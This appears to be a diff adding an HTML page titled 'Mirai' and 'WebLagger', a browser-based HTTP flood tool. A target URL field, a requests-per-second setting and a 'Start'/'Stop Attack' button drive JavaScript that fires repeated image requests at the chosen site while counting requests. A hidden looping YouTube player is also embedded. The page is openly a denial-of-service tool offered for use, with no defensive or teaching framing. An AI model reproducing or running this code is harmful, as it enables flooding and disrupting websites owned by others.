@@ -1,0 +1,146 @@
+<html>
+    <head>
+      <title>Mirai</title>
+
+    	<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
+      <link rel="shortcut icon" type="image/jpg" href="https://cdn.discordapp.com/attachments/889897228943118366/893131981477539860/images_1_1.jpeg"/>
+      <style media="screen">
+        body{
+          background-color: magenta;
+        }
+      </style>
+    </head>
+    <body>
+    <center style=""><font size="6" color="bl"><blink> Mirai </blink> </font></center><br>
+    <center><font size="3" color="bl"><blink>WebLagger</blink> </font></center>
+    <br>
+    <div class="container">
+
+    <iframe id="youtube-player" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" width="0" height="0" src="https://www.youtube.com/embed/MdGMp7tZpIo?autoplay=1&amp;loop=1&amp;enablejsapi=1&amp;origin=https%3A%2F%2Flildui.xyz&amp;widgetid=1"></iframe>
+    <hr><br>
+    </div>
+
+    <body style="background-color:pink; color: black">
+    <div style="position:absolute; width:100%; height:100%;">
+    <div style="width:490px; height:326px; position:absolute;">
+    </div>
+
+    <div style="width:240px; height:100px; position:absolute;left:500px; border-color:black;">
+         <fieldset style="width:100%; height:100%;">
+            <legend*></legend>
+            <label>Target/Url<br /> <input id="targetURL" style="width:100%;" value="" /></label>
+  </small>  <small>
+        </fieldset>
+    </div>
+    <div style="width:240px; height:100px; position:absolute; left:780px;">
+         <fieldset style="width:100%; height:100%;">
+           <legend></legend>
+           <br>
+            <button id="fireButton" style="background-color:pink; cursor: pointer; border-color:black; color:black; width:250px; height:70px;">Start</button>
+        </fieldset>
+    </div>
+
+    <div style="width:240px; height:160px; position:absolute; left:500px; top:150px;">
+         <fieldset style="width:100%; height:100%;">
+            <legend> </legend>
+             <label>PACKET : <input style="width:60px;" id="rps" value="500" type="number"/></label><br/><br>
+             <label>Message<br /><input style="width:100%;" id="message" value="abcdefghijklmnopqrstuvwxyz" /></label>
+        </fieldset>
+    </div>
+
+    <div style="width:240px; height:160px;  position:absolute; left:780px; top:150px;">
+         <fieldset style="width:100%; height:100%;">
+             <legend>Attack status:</legend>
+            <dl>
+                <dt>Requested :</dt>
+                <dd id="requestedCtr">0</dd>
+                <dt style="color: black;">Status Req :</dt>
+                <dd style="opacity: 0.5 color: black;" id="succeededCtr">0</dd>
+                <dt style="color: black;">Request failed :</dt>
+                <dd style="opacity: 0.5 color: black;" id="failedCtr">0</dd>
+            </dl>
+        </fieldset>
+    </div>
+    </div>
+    </body>
+        <script>
+            (function () {
+                var fireInterval;
+                var isFiring = false;
+                var requestedCtrNode = document.getElementById("requestedCtr"),
+                    succeededCtrNode = document.getElementById("succeededCtr"),
+                    failedCtrNode = document.getElementById("failedCtr"),
+                    targetURLNode = document.getElementById("targetURL"),
+                    fireButton = document.getElementById("fireButton"),
+                    messageNode = document.getElementById("message"),
+                    rpsNode = document.getElementById("rps"),
+                    timeoutNode = document.getElementById("timeout");
+                var targetURL = targetURLNode.value;
+                targetURLNode.onchange = function () {
+                    targetURL = this.value;
+                };
+                var requestsHT = {};
+                var requestedCtr = 0,
+                    succeededCtr = 0,
+                    failedCtr = 0;
+                var makeHttpRequest = function () {
+                                            if (requestedCtr > failedCtr + succeededCtr + 1000) { //Allow no more than 1000 hung requests
+                                                    return;
+                                            };
+
+                        var rID =Number(new Date());
+                        var img = new Image();
+                        img.onerror = function () { onFail(rID); };
+                        img.onabort = function () { onFail(rID); };
+                        img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
+
+                                            img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                        requestsHT[rID] = img;
+                        onRequest(rID);
+                    };
+
+                var onRequest = function (rID) {
+                        requestedCtr++;
+                        requestedCtrNode.innerHTML = requestedCtr;
+                    };
+
+                var onComplete = function (rID) {
+                        delete requestsHT[rID];
+                    };
+
+                var onFail = function (rID) {
+                       // failedCtr++;
+                        //failedCtrNode.innerHTML = failedCtr;
+
+                                            succeededCtr++; //Seems like the url will always fail it it isn't an image
+                        succeededCtrNode.innerHTML = succeededCtr;
+                        delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
+                    };
+
+                var onSuccess = function (rID) {
+                        succeededCtr++;
+                        succeededCtrNode.innerHTML = succeededCtr;
+                        delete requestsHT[rID];
+                    };
+
+                fireButton.onclick = function () {
+                    if (isFiring) {
+                        clearInterval(fireInterval);
+                        isFiring = false;
+                        this.innerHTML = "START";
+                    } else {
+                        isFiring = true;
+                        this.innerHTML = "Stop Attack";
+
+                        fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+                    }
+                };
+
+            })();
+
+    isFiring = true;
+    document.getElementById("fireButton").innerHTML = "Start";
+    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
+        </script>
+    </body>
+    </html>
